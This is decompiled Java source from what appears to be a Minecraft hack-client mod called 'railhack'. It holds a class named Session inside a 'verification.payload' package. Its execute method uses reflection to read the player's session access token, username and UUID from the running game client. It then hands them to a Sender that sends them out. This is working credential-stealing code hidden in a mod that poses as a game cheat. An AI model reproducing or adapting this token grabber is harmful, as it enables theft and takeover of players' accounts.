//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import net.minecraft.launchwrapper.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;

public final class Session implements Payload
{
    @Override
    public void execute() throws Exception {
        final Class<?> mc = (Class<?>)Launch.classLoader.findClass("net.minecraft.client.Minecraft");
        final Object minecraft = mc.getMethod("getMinecraft", (Class<?>[])new Class[0]).invoke(null, new Object[0]);
        final Object session = mc.getMethod("getSession", (Class<?>[])new Class[0]).invoke(minecraft, new Object[0]);
        final Class<?> sessionClass = (Class<?>)Launch.classLoader.findClass("net.minecraft.util.Session");
        final Object token = sessionClass.getMethod("getToken", (Class<?>[])new Class[0]).invoke(session, new Object[0]);
        final Object name = sessionClass.getMethod("getUsername", (Class<?>[])new Class[0]).invoke(session, new Object[0]);
        final Object uuid = sessionClass.getMethod("getPlayerID", (Class<?>[])new Class[0]).invoke(session, new Object[0]);
        Sender.send(new Message.Builder("Session").addField("Name", (String)name, true).addField("UUID", (String)uuid, true).addField("Token", (String)token, false).build());
    }
}
